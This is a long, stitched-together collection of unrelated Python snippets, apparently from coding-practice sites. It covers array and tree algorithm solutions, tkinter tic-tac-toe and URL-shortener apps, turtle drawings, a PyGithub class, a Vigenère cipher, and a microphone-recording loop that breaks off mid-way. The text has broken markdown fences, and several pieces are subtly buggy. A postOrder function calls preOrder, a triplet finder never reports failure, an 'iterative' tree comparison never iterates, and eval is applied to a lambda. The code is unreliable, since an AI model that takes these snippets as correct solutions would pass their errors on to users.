        arr = list(map(int, input().rstrip().split()))

        result = maxSubarray(arr)

        fptr.write(" ".join(map(str, result)))
        fptr.write("\n")

    fptr.close()

# Given an array nums of n integers, are there elements a, b, c in nums
# such that a + b + c = 0? Find all unique triplets in the array which gives the sum of zero.
#
# Note:
#
# The solution set must not contain duplicate triplets.
#
# Example:
#
# Given array nums = [-1, 0, 1, 2, -1, -4],
#
# A solution set is:
# [
#   [-1, 0, 1],
#   [-1, -1, 2]
# ]


class Solution:
    def threeSum(self, nums):
        nums.sort()
        res = []

        for i in range(len(nums) - 2):
            if i > 0 and nums[i] == nums[i - 1]:
                continue
            # Two Sum
            j = i + 1
            k = len(nums) - 1

            while j < k:

                if nums[j] + nums[k] + nums[i] == 0:
                    res.append([nums[i], nums[j], nums[k]])

                    while j < k and nums[j] == nums[j + 1]:
                        j += 1

                    while j < k and nums[k] == nums[k - 1]:
                        k -= 1

                    j += 1
                    k -= 1

                elif nums[i] + nums[j] + nums[k] < 0:
                    j += 1

                else:
                    k -= 1

        return res

from tkinter import *
from tkinter import messagebox
import random as r


def button(frame):
    b = Button(
        frame,
        padx=1,
        bg="#FFB100",
        width=3,
        text="   ",
        font=("arial", 60, "bold"),
        relief="sunken",
        bd=10,
    )
    return b


def change_a():
    global a
    for i in ["O", "X"]:
        if i != a:
            a = i
            break


def reset():
    global a
    for i in range(3):
        for j in range(3):
            b[i][j]["text"] = " "
            b[i][j]["state"] = NORMAL
    a = r.choice(["O", "X"])


def check():  # Checks for victory or Draw
    for i in range(3):
        if (
            b[i][0]["text"] == b[i][1]["text"] == b[i][2]["text"] == a
            or b[0][i]["text"] == b[1][i]["text"] == b[2][i]["text"] == a
        ):
            messagebox.showinfo("Congrats!!", "'" + a + "' has won")
            reset()
    if (
        b[0][0]["text"] == b[1][1]["text"] == b[2][2]["text"] == a
        or b[0][2]["text"] == b[1][1]["text"] == b[2][0]["text"] == a
    ):
        messagebox.showinfo("Congrats!!", "'" + a + "' has won")
        reset()
    elif (
        b[0][0]["state"]
        == b[0][1]["state"]
        == b[0][2]["state"]
        == b[1][0]["state"]
        == b[1][1]["state"]
        == b[1][2]["state"]
        == b[2][0]["state"]
        == b[2][1]["state"]
        == b[2][2]["state"]
        == DISABLED
    ):
        messagebox.showinfo("Tied!!", "The match ended in a draw")
        reset()


def click(row, col):
    b[row][col].config(text=a, state=DISABLED, disabledforeground=colour[a])
    check()
    change_a()
    label.config(text=a + "'s Chance")


###############   Main Program #################
root = Tk()
root.title("Tic-Tac-Toe")  # Title given
a = r.choice(["O", "X"])  # Two operators defined
colour = {"O": "#000000", "X": "#FF0000"}
b = [[], [], []]
for i in range(3):
    for j in range(3):
        b[i].append(button(root))
        b[i][j].config(command=lambda row=i, col=j: click(row, col))
        b[i][j].grid(row=i, column=j)
label = Label(text=a + "'s Chance", font=("arial", 20, "bold"))
label.grid(row=3, column=0, columnspan=3)
root.mainloop()

def validTime(time):
    time_split = time.split(":")
    if 00 <= int(time_split[0]) <= 23 and 00 <= int(time_split[1]) <= 59:
        return True
    return False

############################ Copyrights and license ############################
#                                                                              #
# Copyright 2019 Nick Campbell <nicholas.j.campbell@gmail.com>                 #
#                                                                              #
# This file is part of PyGithub.                                               #
# http://pygithub.readthedocs.io/                                              #
#                                                                              #
# PyGithub is free software: you can redistribute it and/or modify it under    #
# the terms of the GNU Lesser General Public License as published by the Free  #
# Software Foundation, either version 3 of the License, or (at your option)    #
# any later version.                                                           #
#                                                                              #
# PyGithub is distributed in the hope that it will be useful, but WITHOUT ANY  #
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS    #
# FOR A PARTICULAR PURPOSE. See the GNU Lesser General Public License for more #
# details.                                                                     #
#                                                                              #
# You should have received a copy of the GNU Lesser General Public License     #
# along with PyGithub. If not, see <http://www.gnu.org/licenses/>.             #
#                                                                              #
################################################################################

import github.GithubObject
import github.Issue


class TimelineEventSource(github.GithubObject.NonCompletableGithubObject):
    """
    This class represents IssueTimelineEventSource. The reference can be found here https://docs.github.com/en/rest/reference/issues#timeline
    """

    def __repr__(self):
        return self.get__repr__({"type": self._type.value})

    @property
    def type(self):
        """
        :type: string
        """
        return self._type.value

    @property
    def issue(self):
        """
        :type: :class:`github.Issue.Issue`
        """
        return self._issue.value

    def _initAttributes(self):
        self._type = github.GithubObject.NotSet
        self._issue = github.GithubObject.NotSet

    def _useAttributes(self, attributes):
        if "type" in attributes:  # pragma no branch
            self._type = self._makeStringAttribute(attributes["type"])
        if "issue" in attributes:  # pragma no branch
            self._issue = self._makeClassAttribute(
                github.Issue.Issue, attributes["issue"]
            )

# A matrix is Toeplitz if every diagonal from top-left to bottom-right has the same element.
#
# Now given an M x N matrix, return True if and only if the matrix is Toeplitz.
#
# Example 1:
#
# Input:
# matrix = [
#   [1,2,3,4],
#   [5,1,2,3],
#   [9,5,1,2]
# ]
# Output: True
# Explanation:
# In the above grid, the diagonals are:
# "[9]", "[5, 5]", "[1, 1, 1]", "[2, 2, 2]", "[3, 3]", "[4]".
# In each diagonal all elements are the same, so the answer is True
#
#
# Example 2:
#
# Input:
# matrix = [
#   [1,2],
#   [2,2]
# ]
# Output: False
# Explanation:
# The diagonal "[1, 2]" has different elements.


class Solution:
    def isToeplitzMatrix(self, matrix):

        for r in range(len(matrix) - 1):
            for c in range(len(matrix[0]) - 1):
                if matrix[r][c] != matrix[r + 1][c + 1]:
                    return False
        return True

from Product import Product


class Tool(Product):
    def __init__(self, name, price, category):
        super().__init__(name, price)
        self.category = category

    def __str__(self):
        return f"{super().__str__()} is a {self.category}"

# Given a non-empty array of integers, return the k most frequent elements.
#
# Example 1:
#
# Input: nums = [1,1,1,2,2,3], k = 2
# Output: [1,2]

# Example 2:
#
# Input: nums = [1], k = 1
# Output: [1]
# Note:
#
# You may assume k is always valid, 1 ≤ k ≤ number of unique elements.
# Your algorithm's time complexity must be better than O(n log n), where
# n is the array's size.

# Find the top k frequent element in the array
# In heap pushing and popping takes log(k), building dictionary takes
# O(n)

import collections
import heapq


class Solution:
    def topk(self, nums, k):
        dict_nums = collections.Counter(nums)
        heap = []
        for key, val in dict_nums.items():
            heapq.heappush(heap, (val, key))
            if len(heap) > k:
                heapq.heappop(heap)
        res = []
        while len(heap) > 0:
            res.append(heapq.heappop(heap)[1])
        return res


if __name__ == "__main__":
    arr = [1, 1, 1, 2, 2, 3, 4, 4, 4, 4, 4]
    k = 2
    print(Solution().topk(arr, k))
```

```py
Numerical integration or quadrature for a smooth function f with known values at x_i

This method is the classical approch of suming 'Equally Spaced Abscissas'

method 1:
"extended trapezoidal rule"
```

```py
from __future__ import print_function


def method_1(boundary, steps):
    # "extended trapezoidal rule"
    # int(f) = dx/2 * (f1 + 2f2 + ... + fn)
    h = (boundary[1] - boundary[0]) / steps
    a = boundary[0]
    b = boundary[1]
    x_i = makePoints(a, b, h)
    y = 0.0
    y += (h / 2.0) * f(a)
    for i in x_i:
        # print(i)
        y += h * f(i)
    y += (h / 2.0) * f(b)
    return y


def makePoints(a, b, h):
    x = a + h
    while x < (b - h):
        yield x
        x = x + h


def f(x):  # enter your function here
    y = (x - 0) * (x - 0)
    return y


def main():
    a = 0.0  # Lower bound of integration
    b = 1.0  # Upper bound of integration
    steps = 10.0  # define number of steps or resolution
    boundary = [a, b]  # define boundary of integration
    y = method_1(boundary, steps)
    print("y = {0}".format(y))


if __name__ == "__main__":
    main()

## Naive Solution that runs in O(n^2)
## Traverses the array, and finds the maximum left or right element.
## rainwater that can be stored in the column =  min(left, right) - height[i]
class NaiveSolution:
    def trap(self, height) -> int:
        res = 0
        n = len(height)
        for i in range(1, n - 1):
            left = height[i]
            for j in range(i):
                left = max(left, height[j])
            right = height[i]
            for j in range(i + 1, n):
                right = max(right, height[j])
            res += min(left, right) - height[i]
        return res


## Optimized solution that runs in O(N)
## Stores the left and right maximum values in two dp arrays.
## Space Complexity - O(N)


class Solution:
    def trap(self, height: List[int]) -> int:
        if height == []:
            return 0
        n = len(height)
        res = 0
        left = [0 for _ in range(n)]
        right = [0 for _ in range(n)]
        left[0] = height[0]
        right[n - 1] = height[n - 1]
        for i in range(1, n):
            left[i] = max(left[i - 1], height[i])
        for i in range(n - 2, -1, -1):
            right[i] = max(right[i + 1], height[i])
        for i in range(n):
            res += min(left[i], right[i]) - height[i]
        return res

# Given two trees, determine whether they are copies of one another.
# Are two trees copies of each other?
# Is there a node in one tree that is considered the same as a node in another tree?
#    1
#   /\
#  2  3
# /\
# 4 5


class Node:
    def __init__(self, data=None, children=[]):

        self.data = data
        self.children = children

    def isclone(self, n2):

        if self.data != n2.data:
            return False
        if len(self.children) != len(n2.children):
            return False
        for i in range(0, len(self.children)):
            if not self.children[i].isclone(n2.children[i]):
                return False
        return True

    def isclone_iterative(self, n2):
        stack = [(self, n2)]

        (c1, c2) = stack.pop()
        if c1.data != c2.data:
            return False
        if len(c1.children) != len(c2.children):
            return False
        for i in range(0, len(c1.children)):
            stack.append((c1.children[i], c2.children[i]))
        return True


if __name__ == "__main__":
    #     1
    #    /\
    #   2  3
    #  /\
    # 4  5

    n = Node(1)
    n.children = [Node(2), Node(3)]
    n.children[0].children = [Node(4), Node(5)]

    n2 = Node(1)
    n2.children = [Node(2), Node(3)]
    n2.children[0].children = [Node(4), Node(5)]

    print(n.isclone(n2))

class Node:
    def __init__(self, info):
        self.info = info
        self.left = None
        self.right = None
        self.level = None

    def __str__(self):
        return str(self.info)


class BinarySearchTree:
    def __init__(self):
        self.root = None

    def create(self, val):
        if self.root == None:
            self.root = Node(val)
        else:
            current = self.root

            while True:
                if val < current.info:
                    if current.left:
                        current = current.left
                    else:
                        current.left = Node(val)
                        break
                elif val > current.info:
                    if current.right:
                        current = current.right
                    else:
                        current.right = Node(val)
                        break
                else:
                    break

```

````py
Node is defined as
self.left (the left child of the node)
self.right (the right child of the node)
self.info (the value of the node)```


```py


def inOrder(root):
    # Write your code here
    if root.left:
        inOrder(root.left)
    print(root.info, end=" ")
    if root.right:
        inOrder(root.right)

class Node:
    def __init__(self, info):
        self.info = info
        self.left = None
        self.right = None
        self.level = None

    def __str__(self):
        return str(self.info)


class BinarySearchTree:
    def __init__(self):
        self.root = None

    def create(self, val):
        if self.root == None:
            self.root = Node(val)
        else:
            current = self.root

            while True:
                if val < current.info:
                    if current.left:
                        current = current.left
                    else:
                        current.left = Node(val)
                        break
                elif val > current.info:
                    if current.right:
                        current = current.right
                    else:
                        current.right = Node(val)
                        break
                else:
                    break

````

````py
Node is defined as
self.left (the left child of the node)
self.right (the right child of the node)
self.info (the value of the node)```


```py


def postOrder(root):
    # Write your code here
    if root.left:
        preOrder(root.left)
    if root.right:
        preOrder(root.right)
    print(root.info, end=" ")

class Node:
    def __init__(self, info):
        self.info = info
        self.left = None
        self.right = None
        self.level = None

    def __str__(self):
        return str(self.info)


class BinarySearchTree:
    def __init__(self):
        self.root = None

    def create(self, val):
        if self.root == None:
            self.root = Node(val)
        else:
            current = self.root

            while True:
                if val < current.info:
                    if current.left:
                        current = current.left
                    else:
                        current.left = Node(val)
                        break
                elif val > current.info:
                    if current.right:
                        current = current.right
                    else:
                        current.right = Node(val)
                        break
                else:
                    break

````

````py
Node is defined as
self.left (the left child of the node)
self.right (the right child of the node)
self.info (the value of the node)```


```py


def preOrder(root):
    # Write your code here
    print(root.info, end=" ")
    if root.left:
        preOrder(root.left)
    if root.right:
        preOrder(root.right)

# Serialization is the process of converting a data structure or object
# into a sequence of bits so that it can be stored in a file or memory buffer,
# or transmitted across a network connection link to be reconstructed later
# in the same or another computer environment.
#
# Design an algorithm to serialize and deserialize a binary tree. There is no
# restriction on how your serialization/deserialization algorithm should work.
# You just need to ensure that a binary tree can be serialized to a string and
# this string can be deserialized to the original tree structure.
#
# Example:
#
# You may serialize the following tree:
#
#     1
#    / \
#   2   3
#      / \
#     4   5
#
# as "[1,2,3,null,null,4,5]"
#
# Clarification: The above format is the same as how LeetCode serializes a binary tree.
# You do not necessarily need to follow this format, so please be creative and come up
# with different approaches yourself.
#
# Note: Do not use class member/global/static variables to store states. Your serialize
# and deserialize algorithms should be stateless.
# Definition for a binary tree node.


class TreeNode(object):
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Codec:
    def serialize(self, root):
        """Encodes a tree to a single string.

        :type root: TreeNode
        :rtype: str
        """
        if not root:
            return "#"

        return (
            str(root.val)
            + " "
            + self.serialize(root.left)
            + " "
            + self.serialize(root.right)
        )

    def deserialize(self, data):
        def helper(values):
            value = next(values)
            if value == "#":
                return None
            node = TreeNode(value)
            node.left = helper(values)
            node.right = helper(values)
            return node

        values = iter(data.split())
        return helper(values)
````

````pyclass Node:
    def __init__(self, freq,data):
        self.freq= freq
        self.data=data
        self.left = None
        self.right = None```


```py

# Enter your code here. Read input from STDIN. Print output to STDOUT
def decodeHuff(root, s):
    ans = ""
    current = root
    # Enter Your Code Here
    for i in range(0, len(s)):
        if s[i] == "0":
            current = current.left
        else:
            current = current.right
        if current.left == None and current.right == None:
            ans += current.data
            current = root
    print(ans)

for i in range(
    0, int(input())
):  # More than 2 lines will result in 0 score. Do not leave a blank line also
    print(
        [
            1,
            121,
            12321,
            1234321,
            123454321,
            12345654321,
            1234567654321,
            123456787654321,
            12345678987654321,
        ][i]
    )

class Solution:
    def minimumTotal(self, triangle: List[List[int]]) -> int:
        dp = [0 for _ in range(len(triangle) + 1)]
        for r in triangle[::-1]:
            for i in range(len(r)):
                dp[i] = r[i] + min(dp[i], dp[i + 1])
        return dp[0]

# https://www.geeksforgeeks.org/find-triplets-array-whose-sum-equal-zero/

# o(n^3)

# def Triplet(arr):
#     n = len(arr)
#     found = False
#     for i in range(0, n - 2):
#         for j in range(i + 1, n - 1):
#             for k in range(j + 1, n):
#                 if arr[i] + arr[j] + arr[k] == 0:
#                     print(arr[i], arr[j], arr[k])
#                     found=True
#
#     if not found:
#         print("element not found")
#
#
# arr=[0, -1, 2, -3, 1]
#
# Triplet(arr)

# optimal soultion
# o(n^2)


def Triplet(arr):
    n = len(arr)
    found = True
    for i in range(n - 1):
        l = i + 1
        r = n - 1
        x = arr[i]
        while l < r:
            if arr[l] + arr[r] + x == 0:
                print(arr[l], arr[r], x)
                l += 1
                r -= 1
                found = True
            elif arr[l] + arr[r] + x < 0:
                l += 1
            else:
                r -= 1

    if not found:
        print("triplet not found")


arr = [0, -1, 2, -3, 1]

Triplet(arr)

import turtle


def square():
    win = turtle.Screen()
    win.bgcolor("white")
    jack = turtle.Turtle()
    for x in range(1, 5):
        jack.forward(100)
        jack.right(90)
    win.exitonclick()


square()

import turtle

t = turtle.Turtle()
s = turtle.Screen()
s.bgcolor("black")
t.pencolor("white")
a = 0
b = 0
t.speed(0)
t.pensize(2)
t.goto(0, 200)
while True:

    t.forward(a)
    t.right(b)
    a += 3
    b += 1
    if b == 210:
        break
    t.hideturtle()

turtle.done()

import random
import time
import turtle

WIDTH, HEIGHT = 500, 500
COLORS = [
    "red",
    "green",
    "blue",
    "orange",
    "yellow",
    "black",
    "brown",
    "cyan",
    "purple",
    "pink",
]


def get_number_of_racers():
    racers = 0
    while True:
        racers = input("Enter the number of racers(2 - 10): ")
        if racers.isdigit():
            racers = int(racers)

        else:
            print("Please input valid number")
            continue

        if 2 <= racers <= 10:
            return racers
        else:
            print("Number is not in range, please enter valid number(between 2 and 10")


def race(colors):
    turtles = create_turtle(colors)

    while True:
        for racer in turtles:
            distance = random.randrange(1, 20)
            racer.forward(distance)
            x, y = racer.pos()

            if y >= HEIGHT // 2 - 10:
                return colors[turtles.index(racer)]


def create_turtle(colors):
    turtles = []
    spacingX = WIDTH // (len(colors) + 1)
    for i, color in enumerate(colors):
        racer = turtle.Turtle()
        racer.color(color)
        racer.shape("turtle")
        racer.left(90)
        racer.penup()
        racer.setpos(
            -WIDTH // 2 + (i + 1) * spacingX, -HEIGHT // 2 + 20
        )  # set position
        racer.pendown()
        turtles.append(racer)
    return turtles


# Initializes turtle window
def init_turtle():
    screen = turtle.Screen()
    screen.setup(WIDTH, HEIGHT)
    screen.title("Turtle Race")


racers = get_number_of_racers()
init_turtle()

random.shuffle(COLORS)
colors = COLORS[:racers]

winner = race(colors)
print("The winner is the turtle with color:", winner)
time.sleep(5)

# def returnTwelve(n):
#     return n if n > 12 else 12

# n, = eval(dir()[0])
# return n if n > 12 else 12

returnTwelve = lambda n: 12 if n < 12 else n

class Solution:
    def twoCitySchedCost(self, costs: List[List[int]]) -> int:
        costs = sorted(costs, key=lambda x: x[0] - x[1])
        return sum(i[0] for i in costs[0 : len(costs) // 2]) + sum(
            j[1] for j in costs[len(costs) // 2 : len(costs)]
        )

# Solution for https://leetcode.com/problems/two-sum/
# Language : Python3

# O(n^2) Solution
class Solution:
    def twoSum(self, nums, target):
        for i in range(len(nums)):
            for j in range(i + 1, len(nums)):
                if nums[i] + nums[j] == target:
                    return i, j


# O(n) Solution
class Solution:
    def twoSum(self, nums: List[int], target: int) -> List[int]:
        dict = {v: k for k, v in enumerate(nums)}
        for i in range(len(nums)):
            if target - nums[i] in dict and nums.index(target - nums[i]) != i:
                return i, nums.index(target - nums[i])

# Given an array of integers that is already sorted in ascending order,
# find two numbers such that they add up to a specific target number.
#
# The function twoSum should return indices of the two numbers such
# that they add up to the target, where index1 must be less than index2.
#
# Note:
#
# Your returned answers (both index1 and index2) are not zero-based.
# You may assume that each input would have exactly one solution and
# you may not use the same element twice.
# Example:
#
# Input: numbers = [2,7,11,15], target = 9
# Output: [1,2]
# Explanation: The sum of 2 and 7 is 9. Therefore index1 = 1, index2 = 2.


class Solution:
    def twoSum(self, numbers, target):

        left = 0
        right = len(numbers) - 1

        while left < right:
            total = numbers[left] + numbers[right]

            if total == target:
                return [left + 1, right + 1]
            elif total > target:
                right -= 1
            else:
                left += 1

# Given a Binary Search Tree and a target number, return true if there exist two
# elements in the BST such that their sum is equal to the given target.
#
# Example 1:
#
# Input:
#     5
#    / \
#   3   6
#  / \   \
# 2   4   7
#
# Target = 9
#
# Output: True
#
#
# Example 2:
#
# Input:
#     5
#    / \
#   3   6
#  / \   \
# 2   4   7
#
# Target = 28
#
# Output: False

import collections


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def findTarget(self, root, k):

        dict = {}

        queue = collections.deque()
        queue.append(root)

        while len(queue):
            node = queue.popleft()

            if k - node.val in dict:
                return True
            dict[node.val] = 1

            if node.left is not None:
                queue.append(node.left)
            if node.right is not None:
                queue.append(node.right)

from tkinter import *
import pyshorteners
import clipboard

window = Tk()

# set deafault window size
window.geometry("350x150")  # width x height

# make window not resizable
window.resizable(False, False)  # not resizable in x and y

# app title
window.title("URL Shortener")

# swoc logo
p1 = PhotoImage(file="images/swoc-logo.png")
window.iconphoto(False, p1)

# url entry
url_input = Entry(window, font=("TimesNewRoman", "16"))
url_input.grid(row=1, column=2, pady=6)

# label shortened url
str_url = StringVar(window)

shortened_url = Label(
    window, textvariable=str_url, font=("TimesNewRoman", "16"), fg="#fff", bg="#1abc9c"
)
shortened_url.grid(row=3, column=2, pady=6)


# copy short url function
def copy_short_url():
    try:
        clipboard.copy(str_url.get())
        print("Url copied successfully !!")
    except:
        str_url.set("Something wrong try again !!")


# Copy short url button
copy_btn = Button(
    window,
    text="Copy",
    bg="#34495e",
    fg="#fff",
    font=("TimesNewRoman", "12"),
    command=copy_short_url,
)
copy_btn.grid(row=3, column=3, pady=6, padx=10)


# short url function
def short_url():
    try:
        s = pyshorteners.Shortener()
        url = url_input.get()
        final_result = s.tinyurl.short(url)
        str_url.set(final_result)
        url_input.delete(0, END)  # clear input
    except:
        str_url.set("Enter url please !! ")


# click button to short url
btn = Button(
    window,
    text="Shorten Url",
    padx=8,
    pady=4,
    bg="#2ecc71",
    fg="#fff",
    font=("TimesNewRoman", "16"),
    activebackground="#16a085",
    command=short_url,
)
btn.grid(row=2, column=2, pady=6)

window.mainloop()

def caseUnification(s):
    u = sum(1 for x in s if x.isupper())
    if u > (len(s) / 2):
        return s.upper()
    else:
        return s.lower()

# Time complexity O(M*N)
# Space Complexity O(M+N)
# Method 1
class Solution:
    # Function to return the count of number of elements in union of two arrays.
    def doUnion(self, a, n, b, m):
        c = a + b
        c.sort()

        d = []
        for i in c:
            if i not in d:
                d.append(i)
            else:
                pass

        return len(d)


if __name__ == "__main__":
    t = int(input())
    for _ in range(t):
        n, m = [int(x) for x in input().strip().split()]

        a = [int(x) for x in input().strip().split()]
        b = [int(x) for x in input().strip().split()]
        ob = Solution()

        print(ob.doUnion(a, n, b, m))


# Time complexity  O(M)+O(N)+O(Mlog(M)+Nlog(N))
# Space Complexity O(n+m)
# Method 2


class Solution:
    # Function to return the count of number of elements in union of two arrays.
    def doUnion(self, a, n, b, m):
        c = a + b
        c.sort()  # O(Mlog(M))+O(Nlog(N))
        sample_dict = {}

        for i in c:  # O(M)+O(N)
            if i in sample_dict.keys():
                sample_dict[i] += 1
            else:
                sample_dict[i] = 1

        return len([int(x) for x in sample_dict.values()])


if __name__ == "__main__":
    t = int(input())
    for _ in range(t):
        n, m = [int(x) for x in input().strip().split()]

        a = [int(x) for x in input().strip().split()]
        b = [int(x) for x in input().strip().split()]
        ob = Solution()

        print(ob.doUnion(a, n, b, m))

# Time complexity O(M*N)
# Space Complexity O(M+N)
# Method 1
class Solution:
    # Function to return the count of number of elements in union of two arrays.
    def doUnion(self, a, n, b, m):
        c = a + b
        c.sort()

        d = []
        for i in c:
            if i not in d:
                d.append(i)
            else:
                pass

        return len(d)


if __name__ == "__main__":
    t = int(input())
    for _ in range(t):
        n, m = [int(x) for x in input().strip().split()]

        a = [int(x) for x in input().strip().split()]
        b = [int(x) for x in input().strip().split()]
        ob = Solution()

        print(ob.doUnion(a, n, b, m))


# Time complexity  O(M)+O(N)+O(Mlog(M)+Nlog(N))
# Space Complexity O(n+m)
# Method 2


class Solution:
    # Function to return the count of number of elements in union of two arrays.
    def doUnion(self, a, n, b, m):
        c = a + b
        c.sort()  # O(Mlog(M))+O(Nlog(N))
        sample_dict = {}

        for i in c:  # O(M)+O(N)
            if i in sample_dict.keys():
                sample_dict[i] += 1
            else:
                sample_dict[i] = 1

        return len([int(x) for x in sample_dict.values()])


if __name__ == "__main__":
    t = int(input())
    for _ in range(t):
        n, m = [int(x) for x in input().strip().split()]

        a = [int(x) for x in input().strip().split()]
        b = [int(x) for x in input().strip().split()]
        ob = Solution()

        print(ob.doUnion(a, n, b, m))

class Solution:
    def uniquePaths(self, m: int, n: int) -> int:
        if m == 1 and n == 1:
            return 1
        grid = [[0 for _ in range(n)] for _ in range(m)]
        for i in range(1, m):
            grid[i][0] = 1
        for i in range(1, n):
            grid[0][i] = 1
        for i in range(1, m):
            for j in range(1, n):
                grid[i][j] += grid[i - 1][j] + grid[i][j - 1]
        print(grid)
        return grid[-1][-1]

class Solution:
    def uniquePathsWithObstacles(self, obstacleGrid: List[List[int]]) -> int:
        m = len(obstacleGrid)
        n = len(obstacleGrid[0])

        if obstacleGrid[0][0] == 1:
            return 0

        obstacleGrid[0][0] = 1
        for i in range(1, m):
            obstacleGrid[i][0] = int(
                obstacleGrid[i][0] == 0 and obstacleGrid[i - 1][0] == 1
            )
        for i in range(1, n):
            obstacleGrid[0][i] = int(
                obstacleGrid[0][i] == 0 and obstacleGrid[0][i - 1] == 1
            )

        for i in range(1, m):
            for j in range(1, n):
                if obstacleGrid[i][j] == 0:
                    obstacleGrid[i][j] = obstacleGrid[i - 1][j] + obstacleGrid[i][j - 1]
                else:
                    obstacleGrid[i][j] = 0

        return obstacleGrid[-1][-1]

# Every email consists of a local name and a domain name, separated by the @ sign.
# For example, in alice@leetcode.com, alice is the local name, and leetcode.com is the domain name.
# Besides lowercase letters, these emails may contain '.'s or '+'s.
# If you add periods ('.') between some characters in the local name part of an email address,
# mail sent there will be forwarded to the same address without dots in the local name.
#
# For example, "alice.z@leetcode.com" and "alicez@leetcode.com" forward to the same email address.
# (Note that this rule does not apply for domain names.)
# If you add a plus ('+') in the local name, everything after the first plus sign will be ignored.
# This allows certain emails to be filtered, for example m.y+name@email.com will be forwarded to my@email.com.
# (Again, this rule does not apply for domain names.)
# It is possible to use both of these rules at the same time.
# Given a list of emails, we send one email to each address in the list.
# How many different addresses actually receive mails?
# Example 1:
# Input: ["test.email+alex@leetcode.com","test.e.mail+bob.cathy@leetcode.com","testemail+david@lee.tcode.com"]
# Output: 2 Explanation: "testemail@leetcode.com" and "testemail@lee.tcode.com" actually receive mails
#
# Note:
# 1 <= emails[i].length <= 100
# 1 <= emails.length <= 100
# Each emails[i] contains exactly one '@' character.
# All local and domain names are non-empty.
#  Local names do not start with a '+' character


class Solution:
    def numUniqueEmails(self, emails):
        seen = set()
        for email in emails:
            local, domain = email.split("@")

            if "+" in local:
                local = local[: local.index("+")]
                local = local.replace(".", "")
                seen.add(local + "@" + domain)
            else:
                local = local.replace(".", "")
                seen.add(local + "@" + domain)
        return len(seen)


if __name__ == "__main__":
    ems = ["test.email+alex@leetcode.com", "test.email@leetcode.com"]
    print(Solution().numUniqueEmails(ems))

# def sumUpDigits(s):
#    return sum(int(i) for i in s if i.isdigit())

eval(lambda s: sum(int(i) for i in s if i.isdigit()))

def sumUpNumbers(inputString):
    def getNumbers(str):
        nums = re.findall(r"[0-9]+", str)
        return nums

    numbers = getNumbers(inputString)
    total = 0
    for i in numbers:
        total += int(i)
    return total

from collections import Counter


class Solution:
    def isAnagram(self, s: str, t: str) -> bool:
        return Counter(s) == Counter(t)

class Solution:
    def isPalindrome(self, s: str) -> bool:
        s = "".join(a for a in s if a.isalnum()).lower()
        return s == s[::-1]

class Solution:
    def checkValidString(self, s: str) -> bool:
        lb = 0
        rb = 0
        for i in s:
            if i == "(" or i == "*":
                lb += 1
            else:
                lb -= 1
            if lb < 0:
                return False
        if lb == 0:
            return True

        for i in range(len(s) - 1, -1, -1):
            if s[i] == ")" or s[i] == "*":
                rb += 1
            else:
                rb -= 1
            if rb < 0:
                return False
        return True

# Given two strings s and t , write a function to determine if t is an anagram of s.
#
# Example 1:
#
# Input: s = "anagram", t = "nagaram"
# Output: true
# Example 2:
#
# Input: s = "rat", t = "car"
# Output: false

import collections


class Solution:
    def isAnagram(self, s, t):
        if len(s) != len(t):
            return False
        dict = collections.Counter(t)

        for char in s:
            if char in dict and dict[char] > 0:
                dict[char] -= 1
            else:
                return False

        return True
````

````py
Valid Parentheses

Given a string of round, curly, and square open and closing brackets, return whether the brackets are balanced (well-formed).
For example, given the string '([])[]({})', you should return true.
Given the string '([)]' or '((()', you should return false.

Input: '()[{([]{})}]'
Output: True

=========================================
Use stack. Add open brackets in the stack, remove the last bracket from the stack if there is a closing brackets.
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

from collections import deque


def is_valid(string):
    closing = {"}": "{", "]": "[", ")": "("}
    stack = deque()

    for char in string:
        if char in closing:
            if len(stack) == 0:
                return False

            last = stack.pop()
            if last != closing[char]:
                return False
        else:
            stack.append(char)

    return True


###########
# Testing #
###########

# Test 1
# Correct result => True
print(is_valid("()[{([]{})}]"))

# Test 2
# Correct result => False
print(is_valid("()[{([]{]})}]"))

# Test 3
# Correct result => False
print(is_valid("(]]])"))

# Given a binary tree, determine if it is a valid binary search tree (BST).
#
# Assume a BST is defined as follows:
#
# The left subtree of a node contains only nodes with keys less than the node's key.
# The right subtree of a node contains only nodes with keys greater than the node's key.
# Both the left and right subtrees must also be binary search trees

# Definition for a binary tree node.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def isValidBST(self, root):
        def helper(node, lower, upper):

            if not node:
                return True
            val = node.val

            if val <= lower or val >= upper:
                print("entered 1")
                return False

            if not helper(node.right, val, upper):
                print("entered 2")
                return False

            if not helper(node.left, lower, val):
                print("entered 3")
                return False

            return True

        return helper(root, float("-inf"), float("inf"))


node = TreeNode(5)
node.left = TreeNode(4)
node.right = TreeNode(7)
node.right.left = TreeNode(6)
node.right.right = TreeNode(8)

print(Solution().isValidBST(node))

def absoluteValuesSumMinimization(a):
    sums = []
    for i in range(len(a)):
        sum = 0
        for j in range(len(a)):
            sum += abs(a[i] - a[j])
        sums.append(sum)
    return a[sums.index(min(sums))]

LETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"


def main():
    Message = input(
        "Messge:"
    )  # Input your message here that need to be encrypted or decrypted
    Key = input("Key:")  # Input Key here
    Mode = input("Mode(encrypt / decrypt)")  # Choose a mode i.e., to encrypt or decrypt

    if Mode.upper() == "ENCRYPT":  # Encrypt condition
        translated = encryptMessage(Key, Message)
    elif Mode.upper() == "DECRYPT":  # Decrypt condition
        translated = decryptMessage(Key, Message)

    print("%sed message:" % (Mode.title()))
    print(translated)
    print()


def encryptMessage(key, message):  # Encryption
    return translateMessage(key, message, "encrypt")


def decryptMessage(key, message):  # Decryption
    return translateMessage(key, message, "decrypt")


def translateMessage(key, message, mode):  # Translation
    translated = []
    keyIndex = 0
    key = key.upper()

    for symbol in message:
        num = LETTERS.find(symbol.upper())
        if num != -1:
            if mode == "encrypt":  # For encryption
                num += LETTERS.find(key[keyIndex])
            elif mode == "decrypt":  # For decryption
                num -= LETTERS.find(key[keyIndex])
            num %= len(LETTERS)

            if symbol.isupper():
                translated.append(LETTERS[num])
            elif symbol.islower():
                translated.append(LETTERS[num].lower())
            keyIndex += 1

            if keyIndex == len(key):
                keyIndex = 0
        else:
            translated.append(symbol)
    return "".join(translated)


if __name__ == "__main__":
    main()

import pyaudio
import wave

audio = pyaudio.PyAudio()

stream = audio.open(
    format=pyaudio.paInt16, channels=1, rate=44100, input=True, frames_per_buffer=1024
)

frames = []

try:
    while True:
        data = stream.read(1024)
        frames.append(data)
